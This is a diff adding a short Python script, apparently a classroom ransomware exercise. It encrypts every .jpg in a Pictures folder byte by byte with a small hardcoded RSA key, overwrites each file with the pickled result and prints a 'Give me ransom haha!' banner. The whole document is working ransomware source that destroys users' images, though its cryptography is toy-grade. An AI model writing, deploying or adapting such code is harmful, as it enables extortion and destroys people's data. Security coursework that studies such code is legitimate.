@@ -1,0 +1,33 @@
+#!/usr/bin/python3
+import os
+import pickle
+
+def print_banner():
+    print("/" * 70)
+    print("{}{}{}{}{}".format("/" * 20, " " * 10, "ERROR!!!!!", " " * 10, "/" * 20))
+    print("{}{}{}{}{}".format("/" * 20, " " * 5, "Give me ransom haha!", " " * 5, "/" * 20))
+    print("/" * 70)
+
+# Get filenames of all picture files in jpg in /home/csc2023/Pictures
+
+folder_path = './Pictures'
+jpg_files = []
+
+for filename in os.listdir(folder_path):
+    if filename.endswith('.jpg'):
+        jpg_files.append(filename)
+
+# Use RSA encrypt them
+n = 22291846172619859445381409012451
+e = 65535
+
+plain_bytes = b''
+for filename in jpg_files:
+    filename = './Pictures/' + filename
+    with open(filename, 'rb') as f:
+        plain_bytes = f.read()
+    cipher_int = [pow(i, e, n) for i in plain_bytes]
+    with open(filename, 'wb') as f:
+        pickle.dump(cipher_int, f)
+
+print_banner()
